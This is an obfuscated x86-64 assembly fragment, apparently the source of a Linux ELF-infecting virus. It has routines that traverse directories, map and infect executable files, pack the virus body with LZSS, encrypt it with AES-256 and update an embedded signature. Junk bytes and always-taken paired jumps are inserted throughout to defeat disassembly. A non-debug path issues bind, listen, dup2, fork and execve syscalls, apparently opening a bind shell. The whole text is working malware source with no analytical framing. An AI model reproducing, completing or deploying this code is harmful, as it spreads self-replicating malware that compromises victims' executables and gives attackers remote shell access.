..@ux4yz4cJej61:
    OFILE       [rsp+_PROC_OFF.buffer], 0x00
    js          ..@wOKLzv9ZlE89
    jns         ..@wOKLzv9ZlE89
..@lzI8nYE6WX05:
    mov         eax, 0x0
    jmp         ..@kGzVRxEJfBpX
..@wOKLzv9ZlE89:
    cmp         eax, 0x3
    jmp         $+4
db 0x46, 0xb0
    jmp         $+3
db 0xf9
    js          ..@zEZaLMiDHk9G
    jns         ..@zEZaLMiDHk9G
..@8WehPr3aRS1N:
    call_vsp    Aes256KeyCreation
    jmp         $+4
db 0xa6, 0x92
    jmp         ..@RcGF08FzDU3D
..@EZBxd5jqut9w:
    mov         QWORD [rsp+_AESE_OFF.length], r2
    mov         QWORD [rsp+_AESE_OFF.keyaddr], r3
    mov         rsi, rsp
    jmp         $+5
db 0x92, 0xa0, 0xeb
    jmp         ..@av2QpFTXvgha
..@7eb9Acidp0Td:
    mov         QWORD [rsp+_KEYGEN_OFF.bufferaddr], r1
    je          ..@jnmSchPsCWIy
    jne         ..@jnmSchPsCWIy
..@W1Q1tdJshnLC:
%ifdef X86_32
    pop         rdx
%endif
    jmp         $+5
db 0x0b, 0xf5, 0x4b
    je          ..@IG32CkQYGrUd
    jne         ..@IG32CkQYGrUd
..@OSwFS8lWN7ck:
    pop         rsi
    add         rdi, 0x4
    mov         rsi, QWORD [rsp+_PAYLOAD_OFF.entry]
    jb          ..@dT7F8fgcAQme
    jae         ..@dT7F8fgcAQme
..@7ibetLnsTsG8:
    pop         r1
    jmp         $+4
db 0x56, 0x68
    jl          ..@xrAYn7tunSWh
    jge         ..@xrAYn7tunSWh
..@vxqF6P6ggX8o:
    add         rdi, rcx
    jmp         $+5
db 0xf0, 0x2e, 0x50
    jmp         ..@xFqcTpkNkYcr
..@0Y1FJiNQJXUt:
    sub         ebx, 1
    js          ..@GFqnhf0gB2vV
    jns         ..@GFqnhf0gB2vV
..@XO3TKdF79duJ:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    jmp         ..@qVTWvRciSdwU
..@R0gizFzEjRMu:
    jl          ..@ni31vuELheSw
    jmp         $+3
db 0x3c
    jmp         $+4
db 0xb0, 0x2e
    jmp         $+3
db 0x97
    jmp         $+4
db 0x7c, 0x44
    js          ..@y7sKxh2kK5oE
    jns         ..@y7sKxh2kK5oE
..@tnTbfddOLDuQ:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    je          ..@gNZVU9t9ubvZ
    jne         ..@gNZVU9t9ubvZ
..@EtpGIhrIbSPm:
    jne         ..@hWWPCzhBrzWY
    jmp         ..@FiN641rzbiQk
..@jumdj2BKe2yq:
    jmp         ..@aBCV9tGXDRWw
    jmp         $+3
db 0xdf
    jl          ..@jdRRaJQ0Oobv
    jge         ..@jdRRaJQ0Oobv
LzssEncoder:
    jmp         ..@Ibk8WB6kLbuj
..@OcghNPzjuqnI:
    mov         rsi, rdi
    add         rdi, rbx
    mov         dx, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         ..@xyF9CEYvmHFf
..@je9N15gYPeCs:
    xor         r4, r4
    mov         r4d, DWORD [r1 + file.filefd]
    mov         r5, r1
    js          ..@xuG6mD1j1pUF
    jns         ..@xuG6mD1j1pUF
..@bVEDHNEkO4Jh:
%ifndef ENABLE_DEBUGGING
    mov         eax, SYS_BIND
    syscall
    push        rax
%endif
    jl          ..@qGnozVHnMXea
    jge         ..@qGnozVHnMXea
..@D4uN6bTlUFui:
    xor         r2, r2
    jmp         $+4
db 0x5d, 0x31
    jmp         ..@jaiR4Nm3qFWk
..@6it4v6xZUX1D:
    xor         rbx, rbx
    jl          ..@DulTC7c5xsUo
    jge         ..@DulTC7c5xsUo
..@hKj6kwqwEsc2:
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    jb          ..@abOADxwojGwO
    jae         ..@abOADxwojGwO
..@GfF0clfgMjD5:
    pop         rcx
    jb          ..@OWRsq2JGm86O
    jae         ..@OWRsq2JGm86O
..@FpCI4ho6rtC5:
    and         rsp, 0xfffffffffffffff0
    mov         QWORD [rsp+_AESE_OFF.startaddr], r1
    js          ..@iiDChrJZyNJg
    jns         ..@iiDChrJZyNJg
..@z3zsvtrcLaQn:
%ifdef X86_64
    mov         r10, 0x22
    mov         r8, 0xffffffffffffffff
    mov         eax, SYS_MMAP
%endif
    jl          ..@Le6FUlenkwYs
    jge         ..@Le6FUlenkwYs
..@dEVm5cIonMwR:
    and         r2, 0xfffffffffffffff0
    jmp         $+4
db 0x9a, 0x7c
    js          ..@SRU8AkozGR1D
    jns         ..@SRU8AkozGR1D
..@hfh8UPEgfXyT:
    add         WORD [rsp+_LZSSE_OFF.buffersize], cx
    rep         movsb
    push        rsi
    jmp         $+5
db 0x96, 0xf4, 0x01
    jl          ..@BhAMqS0Ud1U6
    jge         ..@BhAMqS0Ud1U6
..@5V2DykwmXljs:
    mov         eax, 1
    je          ..@Loh9FDJIiJUg
    jne         ..@Loh9FDJIiJUg
..@huwABAA6dq8b:
    pop         r4
    jmp         $+3
db 0x61
    jmp         ..@M8LruFBqG65c
..@E1iFyb5DgzLF:
    push        rax
    jmp         $+3
db 0xdb
    je          ..@s9NJdMEVrjUS
    jne         ..@s9NJdMEVrjUS
..@NuE303sJqYN6:
    pop         rax
    mov         r5, r1
    jmp         $+3
db 0xdb
    je          ..@DEXNLnCIoIxl
    jne         ..@DEXNLnCIoIxl
..@qiSJn112LCPC:
    xor         rax, rax
    js          ..@8SX5f8xToNmc
    jns         ..@8SX5f8xToNmc
..@dMFEo8O4fnUB:
    push        rax
    pop         rax
    je          ..@RGnV0XU2rDTj
    jne         ..@RGnV0XU2rDTj
..@pzQhMyfepJgS:
    jnz         ..@ZGwvYCTe1Wa9
    jmp         ..@vNKc5hhTZ3n2
    jb          ..@vNKc5hhTZ3n2
    jae         ..@vNKc5hhTZ3n2
..@DbPQwzbtoPu1:
    mov         r2, m6
    add         r2, _virus-_start
    jmp         ..@z5F52e2ZqIsK
..@1LRdNm4IWYfI:
    sub         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH
    push        rdi
    pop         rdi
    jmp         ..@WsfHCzEZZt3d
..@RC2MzAyFlmAc:
    test        al, al
    jmp         $+3
db 0x70
    jb          ..@VgUf4dKl502m
    jae         ..@VgUf4dKl502m
..@Y27DPo2J3ZLF:
%ifdef X86_64
    mov         r8d, DWORD [r8+file.filefd]
    mov         eax, SYS_MMAP
%endif
    js          ..@DRX5LMmK5oRG
    jns         ..@DRX5LMmK5oRG
..@rmDQsLpmuk8Q:
    push        r2
    sub         rsp, _DYNPIE_OFF_size
    js          ..@0jxionm42Tgm
    jns         ..@0jxionm42Tgm
..@XZZdjs3W6g7h:
    sub         rsp, _PAYLOAD_OFF_size
    mov         QWORD [rsp+_PAYLOAD_OFF.entry], r1
    mov         WORD [rsp+_PAYLOAD_OFF.index], r2w
    jmp         $+5
db 0x96, 0xf7, 0xe2
    je          ..@jZNHZu1OlzXk
    jne         ..@jZNHZu1OlzXk
..@DRX5LMmK5oRG:
%ifdef X86_64
    syscall
%endif
    jb          ..@oXkjn2EL2JWR
    jae         ..@oXkjn2EL2JWR
..@i2zsWIqpZap5:
    VAR         packed, urandom
    OFILE       [r5], 0x00
    jmp         $+5
db 0x2f, 0x0d, 0xe9
    jmp         ..@QSivfUYUyo8Q
..@tbvOWIdWk4q4:
    push        r4
    js          ..@GHiekcIYlsLc
    jns         ..@GHiekcIYlsLc
..@S5MFFLoLvXEp:
    rep         nop
    jmp         $+4
db 0x9c, 0xdf
    jmp         ..@UkrvE4xg9IuN
..@v1MFiXK61kyr:
    mov         DWORD [rsp+_INFDIR_OFF.dirfd], eax
    jmp         $+5
db 0x91, 0x01, 0xd0
    js          ..@mG6WOAut9eoE
    jns         ..@mG6WOAut9eoE
..@fck2HvvCpBIa:
    syscall
    test        al, al
    jmp         $+3
db 0x83
    jmp         ..@OIJN5ndBhstV
..@X6kEbCE823Iu:
    mov         QWORD m5, 0x01
    sub         rsp, 0x100
    js          ..@e7oApdnIGb3w
    jns         ..@e7oApdnIGb3w
..@JWcDmXpxNIFY:
    shl         ebx, LENGTH_BITS
    jmp         $+3
db 0x12
    jmp         ..@8p5v9m76o2EQ
IsNum:
    jmp         ..@N7rVuYGCH1YG
..@NFm6dplKuGsH:
    mov         r2, 0x100
    jmp         $+5
db 0x83, 0x76, 0x42
    jmp         $+3
db 0x07
    jb          ..@WyTLoEOo1oBX
    jae         ..@WyTLoEOo1oBX
..@0QM5WAFKdBhA:
    xchg        rdx, rdx
    push        rdx
    jmp         $+4
db 0x7f, 0x4a
    jb          ..@INO4LTeg1PaT
    jae         ..@INO4LTeg1PaT
..@DKjItfNSlnyh:
    cmp         eax, 0x00
    jl          ..@bDyBgTnpy7r7
    jb          ..@142GWEyEpr3C
    jae         ..@142GWEyEpr3C
..@mlT4MU8qBJGZ:
    push        r5
    sub         rsp, _UPDATASIG_OFF_size
    mov         QWORD [rsp+_UPDATASIG_OFF.signaddr], r1
    js          ..@69MRjvR02oeR
    jns         ..@69MRjvR02oeR
..@GSTf4kd6RCsr:
    xchg        rcx, rcx
    pop         r4
    jmp         $+3
db 0xa5
    jl          ..@yngZPj8iM9bC
    jge         ..@yngZPj8iM9bC
Aes256Encryption:
    jmp         ..@wgYWdsSztdpZ
..@cIfquqkQTPma:
%ifndef ENABLE_DEBUGGING
    rep         nop
%endif
    jmp         $+4
db 0x55, 0xac
    jmp         $+5
db 0xbd, 0xc9, 0xb5
    jmp         ..@DG1v8OiRgBnq
..@mXQFTrDYDHW8:
    pop         rbx
    jmp         $+5
db 0xff, 0x7e, 0x6a
    jmp         $+4
db 0x3a, 0xdd
    jmp         ..@F353zxsNQXuw
..@wUFDh5b2DFmV:
    mov         rdx, rdx
    jmp         $+5
db 0x65, 0xae, 0x92
    jl          ..@5SUa8WsTn10Q
    jge         ..@5SUa8WsTn10Q
..@wtr81vGkEaSJ:
    mov         r2, QWORD [r5+file.filesize]
    jmp         $+5
db 0xfa, 0x78, 0x3f
    jmp         $+3
db 0xd2
    jl          ..@Ol87BsLfCN9n
    jge         ..@Ol87BsLfCN9n
..@LanwRcGaolSh:
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    jmp         $+5
db 0xed, 0xb8, 0x3f
    jmp         $+5
db 0x3b, 0xde, 0xcd
    jmp         $+4
db 0x84, 0xa8
    jmp         $+5
db 0x07, 0x9f, 0xfd
    js          ..@0QM5WAFKdBhA
    jns         ..@0QM5WAFKdBhA
..@8s2VeMXvNryz:
    test        eax, eax
    jl          ..@28kq6nXfirxG
    jge         ..@28kq6nXfirxG
..@ePaSlgvZIKMB:
    add         r1, QWORD [r2]
    jmp         $+3
db 0x6c
    jmp         $+4
db 0xbc, 0x8d
    jmp         $+3
db 0x54
    jmp         ..@ssGRqXVzT0n6
..@c9NmmrmZeqIb:
    call        UnmapFile
    mov         r2, 11b
    push        rbx
    jmp         $+5
db 0x38, 0xa6, 0x45
    jb          ..@AJKdtPdReRbP
    jae         ..@AJKdtPdReRbP
..@wpM5i8KexwZm:
    xor         r1, r1
    jl          ..@pWQnBEdAgSz7
    jge         ..@pWQnBEdAgSz7
..@s3LYLIVK0Iqd:
    xor         r2, r2
    xor         r3, r3
    jmp         ..@to5fzznV41RZ
..@1O8lhlXURxrj:
    pop         rcx
    jb          ..@RwsPdkZCcmKx
    jae         ..@RwsPdkZCcmKx
..@OZEVB6o1bGVW:
    add         rsp, _UPDATASIG_OFF_size
    jmp         $+5
db 0x47, 0x5b, 0x0d
    jl          ..@WELLzgULDgrM
    jge         ..@WELLzgULDgrM
..@wr2Tci2WFHjL:
    mov         rdi, rdi
    jb          ..@Gk0BmP6bBfD6
    jae         ..@Gk0BmP6bBfD6
..@Xzlw6TyN6BLg:
    jl          ..@yjkLuwF1r98O
    jmp         $+4
db 0x63, 0x53
    js          ..@v1MFiXK61kyr
    jns         ..@v1MFiXK61kyr
..@2UzF1BkwcxD6:
%ifndef ENABLE_DEBUGGING
    mov         eax, SYS_LISTEN
%endif
    jmp         $+4
db 0x13, 0xd2
    jl          ..@TDPGxWyCtWnm
    jge         ..@TDPGxWyCtWnm
..@QSivfUYUyo8Q:
    cmp         eax, 0x3
    jl          ..@MeoZnjHBSo7k
    mov         DWORD [rsp+_KEYGEN_OFF.fd], eax
    jmp         $+5
db 0xf6, 0x6d, 0x5d
    jmp         $+3
db 0x1a
    jmp         ..@YMc3NFB3F8vj
..@RRDurzV4EWxK:
%ifndef ENABLE_DEBUGGING
    jge         ..@0WBXGIc6DeBw
    xor         rax, rax
    xor         r2, r2
%endif
    jmp         $+3
db 0xd5
    jmp         $+5
db 0x5c, 0x44, 0x26
    je          ..@uelZpXPoTQ9k
    jne         ..@uelZpXPoTQ9k
..@hLZE8ZW43jFi:
    mov         al, BYTE [rdi]
    push        rax
    je          ..@orl06VT9vxj3
    jne         ..@orl06VT9vxj3
..@FtXjOYFyMmx1:
    movdqu      xmm1, oWORD [rsp+0xc0]
    aesenc      xmm0, xmm1
    jmp         ..@PbUpc2DdyfsO
..@eQguYNCgXvyu:
    add         rbx, 1
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    jmp         ..@90aXdMlHmQAL
..@jcUJW61m8wzw:
    call_vsp    Strlen
    jmp         ..@UG3nqUzwV2uB
..@xFqcTpkNkYcr:
    add         rsi, rcx
    mov         rax, rax
    jb          ..@xjVdGcQvMv1V
    jae         ..@xjVdGcQvMv1V
..@fajKYMGyfx52:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], 0
    mov         QWORD [rsp+_VADDR_OFF._vaddr], 0
    jmp         ..@it33fxaJ69Qo
..@563Qr773QADA:
    jge         ..@UjYHNYXphJVA
    jmp         $+3
db 0x98
    jl          ..@kV4r2zGHl5iH
    jge         ..@kV4r2zGHl5iH
..@YqAyuxKpZI5m:
    mov         r3, non_packed_len
    push        rdx
    pop         rdx
    jl          ..@e8GfG099MPkc
    jge         ..@e8GfG099MPkc
..@36dyhIm8jz2a:
%ifndef ENABLE_DEBUGGING
    mov         eax, SYS_EXECVE
%endif
    jl          ..@zXdD1YVuCHT0
    jge         ..@zXdD1YVuCHT0
..@PNLKGjNhODCw:
    xchg        rsp, rsp
    jmp         $+3
db 0x6a
    jmp         $+3
db 0xde
    jmp         ..@B1A8gUw3rFO5
..@mbHxbAQJRKJF:
    cmp         BYTE [rsp+_LZSSE_OFF.match_len], MIN_LENGTH
    je          ..@eDi3V1G9C5th
    jne         ..@eDi3V1G9C5th
..@2QtJVKJ2aFx7:
    xchg        rcx, rcx
    and         eax, edx
    test        eax, eax
    jmp         ..@ROlTtJc7xpAc
..@WSuscCFOV24C:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x50]
    jmp         $+5
db 0x81, 0xcc, 0xec
    jmp         $+5
db 0xaa, 0x8d, 0x1e
    jmp         $+4
db 0x2c, 0x1a
    jl          ..@cEByjWQkQrWm
    jge         ..@cEByjWQkQrWm
..@Le6FUlenkwYs:
%ifdef X86_64
    syscall
%endif
    jmp         $+5
db 0x1c, 0x34, 0x20
    jmp         $+3
db 0xb0
    jmp         $+3
db 0x2e
    jl          ..@5VhQxP6vS3nM
    jge         ..@5VhQxP6vS3nM
GetNewProgramVaddr:
    jmp         ..@SCpPFT4Ohyew
..@l8nTeZwFbKHf:
    jmp         ..@S5OqQFSC9j6O
    push        rax
    jmp         $+3
db 0x56
    jmp         ..@wZO8cYfLncq8
..@KhQxAiJYwPr7:
    cmp         r2d, '../'
    jl          ..@dzM8w53vP8PP
    jge         ..@dzM8w53vP8PP
..@gxWRhbUzAC7e:
    push        rdi
    jmp         ..@LEPgnHP9ogl5
..@aQDgTPM05aMb:
    xor         rax, rax
    xor         rdi, rdi
    jl          ..@NR3njObHmoxG
    jge         ..@NR3njObHmoxG
..@zCqic50cQRFm:
    sub         WORD [rsp+_LZSSE_OFF.w_index], WINDOW_LENGTH
    jl          ..@CI4iqkyMcebm
    jge         ..@CI4iqkyMcebm
..@NR3njObHmoxG:
    xor         rcx, rcx
    mov         ecx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    jmp         $+4
db 0x92, 0x01
    jmp         ..@CHEFqarHgzPC
..@QpR9Gm1CrtXm:
    add         r1, 1
    jmp         $+5
db 0xc2, 0x35, 0x9d
    je          ..@YXWscK47AZBt
    jne         ..@YXWscK47AZBt
..@JA8OvFhfyhxY:
    je          ..@MUFI9CprduWv
    cmp         rax, 0x01
    jmp         ..@kT5hJHRhLonK
..@KFDxoSYXfNzc:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    jl          ..@N34zYAdhb5uz
    jge         ..@N34zYAdhb5uz
..@t9TRBltvv61m:
    mov         ax, dx
    jmp         $+5
db 0xf2, 0x96, 0xe2
    jmp         ..@jjVCKl9L01cq
..@GbFvti5VxtQ2:
    xchg        rbx, rbx
    xchg        rsi, rsi
    cmp         r4, QWORD [rsp+_INFDIR_OFF.dirnread]
    jmp         $+4
db 0x7b, 0x2f
    jmp         ..@RfsXXvk04dJR
..@0cptoUtIlDpH:
    mov         r3d, 0x02
    jmp         $+3
db 0xd0
    jmp         $+4
db 0x37, 0x37
    jb          ..@QServwCbSVQ4
    jae         ..@QServwCbSVQ4
..@7Wf05n5s5ayh:
    VAR         packed, dirs_tmp
    push        rdx
    jmp         $+5
db 0x0b, 0x13, 0x05
    jmp         $+5
db 0x49, 0xbd, 0x44
    jmp         $+5
db 0x1b, 0xf1, 0x91
    jl          ..@fQh082PFW3Dc
    jge         ..@fQh082PFW3Dc
..@UkrvE4xg9IuN:
    add         eax, 0x57
    jmp         $+3
db 0x82
    js          ..@digXFuKZGANM
    jns         ..@digXFuKZGANM
..@UpBzgESU6RKx:
    call        LzssEncoder
    mov         rdi, m6
    add         rdi, non_packed_len
    jmp         ..@oljFh73q1ABo
..@W6EyXucwiPhv:
    pop         rcx
    call        KeyGen
    jmp         $+5
db 0xae, 0x9f, 0x5c
    jmp         ..@s3LYLIVK0Iqd
..@KHj72SiTcjs0:
    pop         r2
    mov         rsp, rsp
    jmp         $+5
db 0x2d, 0x94, 0x35
    jmp         $+3
db 0x56
    jmp         $+4
db 0xff, 0x82
    js          ..@tMy8p2USswmf
    jns         ..@tMy8p2USswmf
..@1Ph7BUakAw74:
%ifdef X86_64
    xor         rax, rax
    xor         rdi, rdi
    xor         rdx, rdx
%endif
    jb          ..@9DpYq7tN8Uyw
    jae         ..@9DpYq7tN8Uyw
..@Jv2MRvRVTMC8:
    mov         r4, m7
    js          ..@VYcZNoO8kwj7
    jns         ..@VYcZNoO8kwj7
..@DVaYPeCIMVyK:
    push        rdi
    jmp         $+5
db 0xe8, 0x44, 0xe9
    jb          ..@T4EnXi9erzL6
    jae         ..@T4EnXi9erzL6
..@RGnV0XU2rDTj:
    and         rax, DF_1_PIE
    jmp         $+4
db 0xc4, 0xc0
    jmp         $+5
db 0x03, 0xbb, 0x77
    jmp         ..@trsd2KHfgVrU
..@KvL7DLMsesIG:
    push        r2
    push        r3
    mov         rbx, rbx
    jb          ..@pC9g6ENk5Utt
    jae         ..@pC9g6ENk5Utt
..@TDPGxWyCtWnm:
%ifndef ENABLE_DEBUGGING
    mov         rdi, rdi
%endif
    jmp         ..@gwUFCdDF5BU6
..@Zo2Zcf01Eqcr:
    mov         rsi, r5
    je          ..@oGEaLehuDcd4
    jne         ..@oGEaLehuDcd4
..@UzeGdTtGeW39:
    push        r2
    push        r1
    mov         r5, QWORD [r1+file.fileptr]
    jmp         $+4
db 0x0f, 0xa2
    jmp         ..@Ipxk7TzMULDo
..@QQ9PFwBhvqxW:
    xor         r2, r2
    jmp         ..@HomwKn3ca0Kg
..@P2hEF1dhYu5D:
    jne         ..@hWWPCzhBrzWY
    xchg        rdi, rdi
    jmp         ..@yuPgpXrahys3
..@5SUa8WsTn10Q:
    xor         rax, rax
    xor         rbx, rbx
    jb          ..@hLZE8ZW43jFi
    jae         ..@hLZE8ZW43jFi
..@jdRRaJQ0Oobv:
    xchg        rax, rax
    rep         nop
    js          ..@kU1lqE4X9oAq
    jns         ..@kU1lqE4X9oAq
..@L3DshC5GdBRS:
    syscall
    ret
    jl          Aes256Encryption
    jge         Aes256Encryption
..@M8LruFBqG65c:
    ret
    je          MapFile
    jne         MapFile
..@DEXNLnCIoIxl:
    xor         rax, rax
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+3
db 0x4d
    jl          ..@QelgF85a2Jd0
    jge         ..@QelgF85a2Jd0
..@dT7F8fgcAQme:
    mov         QWORD [rdi], rsi
    jmp         $+4
db 0x3e, 0x50
    je          ..@TGTFXbBt369U
    jne         ..@TGTFXbBt369U
..@9dA4ZJFaCcpE:
    xchg        rsp, rsp
    jl          ..@LmV1haaAYSoF
    jge         ..@LmV1haaAYSoF
..@5y0lxOvEgQlv:
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    mov         rbp, rbp
    push        rbx
    jmp         $+5
db 0xa8, 0x6e, 0x88
    je          ..@leWUbuvtuewe
    jne         ..@leWUbuvtuewe
..@lKMk5qIqjQkG:
    lea         r1, [rsp+_NBF_OFF.key]
    call        KeyGen
    mov         r5, QWORD [rsp+_NBF_OFF.file]
    jb          ..@WK2Wc8y5Kcxn
    jae         ..@WK2Wc8y5Kcxn
..@qi2BNOiIWeyD:
    sub         rcx, m6
    mov         eax, 0x00
    rep         stosb
    jmp         $+4
db 0x3d, 0xc0
    jmp         ..@aT8BpEUvicRa
..@ojQecUbbYoPw:
    jne         ..@mmaIxPWflqsu
    xchg        rcx, rcx
    cmp         BYTE [r1+16], ET_EXEC
    jmp         $+4
db 0x5e, 0x95
    js          ..@giJsYCps22rF
    jns         ..@giJsYCps22rF
..@zsINgtGROFAC:
    lea         r1, [rsp+_INFFILE_OFF.file]
    call        UnmapFile
    xchg        rax, rax
    jmp         ..@hWWPCzhBrzWY
..@VYcZNoO8kwj7:
    sub         r4, m6
    jmp         $+5
db 0xc9, 0x8c, 0x27
    je          ..@MPYY9jpSeqm4
    jne         ..@MPYY9jpSeqm4
..@5xIqndSeOd3G:
    push        rdx
    je          ..@xs0ra7IYqDGe
    jne         ..@xs0ra7IYqDGe
..@NUfZW7RCBeAT:
    push        rbx
    js          ..@mXQFTrDYDHW8
    jns         ..@mXQFTrDYDHW8
..@ZviDWGajGJyE:
    jle         ..@gQcwhaAcZX8a
    jmp         $+5
db 0x7c, 0x70, 0xec
    jmp         $+3
db 0x2d
    jmp         $+3
db 0x8e
    jmp         ..@u1PY0kmrr9AV
..@kkCEEDLS7s9T:
    movdqu      xmm1, oWORD [rsp+0xe0]
    aesenclast  xmm0, xmm1
    jmp         ..@QMPk8KlWvEJX
..@leWUbuvtuewe:
    pop         rbx
    js          ..@IFaBmhvpgtab
    jns         ..@IFaBmhvpgtab
..@ZZxiqDHxLeO2:
    GGLOBAL     _signature.start
    jb          ..@Zo2Zcf01Eqcr
    jae         ..@Zo2Zcf01Eqcr
..@oGEaLehuDcd4:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    xor         rcx, rcx
    mov         ecx, signature_len
    je          ..@puz8YL8599el
    jne         ..@puz8YL8599el
..@7X47Fo4qdbAg:
    mov         rcx, rcx
    jmp         ..@Ffj7hKI4celc
..@LYjClxqj0XjU:
    mov         WORD [rsp+_DYNPIE_OFF.shentsize], ax
    add         r1, 2
    jmp         $+4
db 0x11, 0x32
    jmp         $+5
db 0x63, 0x0e, 0x92
    je          ..@vT4DVSJ9I1Am
    jne         ..@vT4DVSJ9I1Am
..@qVTWvRciSdwU:
    add         rdi, _signature.key_preview-_signature.start
    jmp         $+3
db 0xfc
    jl          ..@XzRIOVhtrlK9
    jge         ..@XzRIOVhtrlK9
..@URN7IXGRwLKR:
%ifndef ENABLE_DEBUGGING
    syscall
    push        rbx
%endif
    je          ..@KwJGr0GOf6Jr
    jne         ..@KwJGr0GOf6Jr
..@dbrgCjecixuy:
    pop         rsi
    jmp         $+4
db 0x7f, 0x9d
    jmp         $+4
db 0x19, 0xcc
    js          ..@R5QdXwt81LDI
    jns         ..@R5QdXwt81LDI
..@eyJZt2aKc7ZC:
    xor         rax, rax
    jmp         $+4
db 0xc6, 0x65
    jmp         $+3
db 0x15
    jmp         $+3
db 0x98
    jl          ..@cB9hMdryZ8VT
    jge         ..@cB9hMdryZ8VT
..@F4xFoZJ8JaTE:
    xchg        rdi, rdi
    jb          ..@733yiTkb6cLg
    jae         ..@733yiTkb6cLg
..@KKTOCrBANMgb:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
    mov         eax, SYS_DUP2
    xchg        rsi, rsi
%endif
    jmp         $+3
db 0x12
    jmp         ..@cIfquqkQTPma
..@wpcxqtxe0hqq:
    call        WORDToDWORDASCII
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    add         rdi, _signature.key_preview-_signature.start+4
    jl          ..@zSppTP6uQ0wq
    jge         ..@zSppTP6uQ0wq
..@q9kBqKe1q1aH:
    mov         DWORD [rdi], eax
    jl          ..@T3w2SyuWBtoG
    jge         ..@T3w2SyuWBtoG
..@WyTLoEOo1oBX:
    mov         rax, SYS_GETCWD
    jmp         $+5
db 0x2c, 0x97, 0x0f
    jmp         ..@9heiXOGvb21E
..@ihaY7TS8p7cQ:
    push        rax
    pop         rax
    js          ..@enjmfRxuwAzg
    jns         ..@enjmfRxuwAzg
..@gc8HcTx3jxzM:
    pop         r1
    jmp         ..@9iNkZlZJL4zj
DestroyPayload:
    jmp         ..@3TEXmlIHNhMX
..@EWU8DXkyMqpj:
    cmp         BYTE [r1], 0x0
    jz          ..@5V2DykwmXljs
    cmp         BYTE [r1], 0x30
    jmp         $+4
db 0x59, 0x3f
    js          ..@R0gizFzEjRMu
    jns         ..@R0gizFzEjRMu
..@xs0ra7IYqDGe:
    pop         rdx
    mov         QWORD [rsp+_DYNPIE_OFF.ptr], r1
    add         r1, e_h.e_shentsize
    jmp         $+4
db 0x24, 0xf8
    js          ..@03j2WNmZK2Q7
    jns         ..@03j2WNmZK2Q7
..@bZw0ScEEjDLH:
%ifndef ENABLE_DEBUGGING
    test        eax, eax
    jz          ..@QMWlfJwMYSUf
    jmp         ..@msoFHxxK2YJh
%endif
    jb          ..@QMWlfJwMYSUf
    jae         ..@QMWlfJwMYSUf
..@KbV9RWJEkWmT:
    xor         r3, r3
    xor         r4, r4
    jmp         ..@c4P24cJjC39Z
..@NXy4ygkIeBoB:
    mov         rbx, rbx
    call        AddSizeMappedFile
    mov         rsi, rsi
    jmp         $+5
db 0x80, 0x77, 0x96
    jmp         $+4
db 0x77, 0x8f
    jmp         ..@3d4fZ4RKOnG6
..@C2blMqPGPlM1:
    mov         rax, SYS_FORK
    je          ..@bxKKaSgkSHTm
    jne         ..@bxKKaSgkSHTm
..@B1A8gUw3rFO5:
    CFILE       [rsp+_INFDIR_OFF.dirfd]
    jmp         ..@yjkLuwF1r98O
InfectFile:
    jmp         ..@zQ9qYHFtx7rR
..@jhy3ngHuDNWn:
    pop         rcx
    mov         BYTE [rsp+_LZSSE_OFF.cmp_len], dl
    mov         rdx, rdx
    jb          ..@WuUvk9SxGFsQ
    jae         ..@WuUvk9SxGFsQ
..@av2QpFTXvgha:
    mov         rdi, QWORD [rsp+_AESE_OFF.keyaddr]
    jmp         $+3
db 0x40
    je          ..@X0ATLR7ZyHWZ
    jne         ..@X0ATLR7ZyHWZ
..@iiDChrJZyNJg:
    xchg        rbx, rbx
    jmp         $+5
db 0xa0, 0x69, 0x32
    jmp         ..@EZBxd5jqut9w
..@Cl65EQ4h9Igr:
    je          ..@S5OqQFSC9j6O
    jmp         $+4
db 0xe3, 0x21
    jmp         $+5
db 0x4d, 0x9a, 0x0a
    js          ..@jGRSHu1hvdsD
    jns         ..@jGRSHu1hvdsD
..@mLnijcBzMXLT:
    movdqu      xmm1, oWORD [rsp+0x30]
    aesenc      xmm0, xmm1
    je          ..@1uRnNk3neClr
    jne         ..@1uRnNk3neClr
..@X0ATLR7ZyHWZ:
    push        rbp
    mov         rbp, [rbp]
    call_vsp    Aes256KeyExpansion
    jmp         $+5
db 0x09, 0xf1, 0xea
    jmp         ..@MFQF7XBhSC7H
..@4UmCsZqMpHZM:
    mov         ecx, 0x8
    rep         movsd
    jmp         $+4
db 0xa5, 0x82
    jmp         $+4
db 0xbf, 0x9f
    jb          ..@rlFupMO3DMaD
    jae         ..@rlFupMO3DMaD
..@XGpnylUGH4T1:
    or          bx, ax
    jmp         ..@ZGwvYCTe1Wa9
..@iv773UUFvSn8:
    pop         rbx
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    jl          ..@VzdDZ76pqV2z
    jge         ..@VzdDZ76pqV2z
..@Z5HKIwZtPvhG:
%ifndef ENABLE_DEBUGGING
    test        eax, eax
    jnz         ..@ENQl3DJZ8rPl
    xor         rax, rax
%endif
    jmp         $+4
db 0x9c, 0xce
    jmp         $+3
db 0xc9
    jl          ..@o9z9YF1HLLnD
    jge         ..@o9z9YF1HLLnD
..@u1PY0kmrr9AV:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], r5
    jl          ..@gQcwhaAcZX8a
    jge         ..@gQcwhaAcZX8a
UnmapFile:
    jmp         ..@z36gzAhzIcNO
..@F1NsL5FL1pnm:
    pop         rsi
    jmp         $+3
db 0xb0
    jmp         $+5
db 0xd1, 0xce, 0x63
    jl          ..@UzeGdTtGeW39
    jge         ..@UzeGdTtGeW39
..@LgVknzVAdKhO:
    pop         r1
    ret
    jmp         $+5
db 0xfa, 0xb5, 0x2e
    jmp         $+4
db 0x44, 0xf0
